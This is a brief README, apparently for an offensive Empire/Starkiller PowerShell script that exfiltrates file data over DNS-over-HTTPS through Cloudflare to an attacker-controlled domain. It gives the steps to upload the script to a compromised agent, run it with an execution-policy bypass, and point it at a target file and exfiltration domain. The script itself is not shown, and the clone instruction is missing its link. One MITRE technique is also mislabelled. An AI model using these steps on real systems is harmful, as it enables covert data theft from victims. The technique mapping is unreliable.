# Empire Scripts: DNS-over-HTTPS Exfiltration

## Prerequisite: Empire/Starkiller setup

![image](https://github.com/user-attachments/assets/889e4c09-ed0e-494c-812e-2dc3b8d6d06d)

Clone from the official github: 

Chunks file data and exfiltrates via Cloudflare DoH endpoint.

### Usage
1. Upload to Empire agent:

   upload dns_over_https.ps1
   
![image](https://github.com/user-attachments/assets/10b9a135-159e-4fac-b91b-c7473c53275d)

   
2. Execute on agent:
   
   ```
   powershell -ExecutionPolicy Bypass -File .\dns_over_https.ps1
   ```

### Configuration
- Modify `$FilePath` to target file
- Set `$DomainSuffix` to your DoH domain (e.g., `teamred.cf`)

### MITRE ATT&CK Mapping

- T1071.004: Application Layer Protocol
- T1539: Steal Cloud Instance Metadata

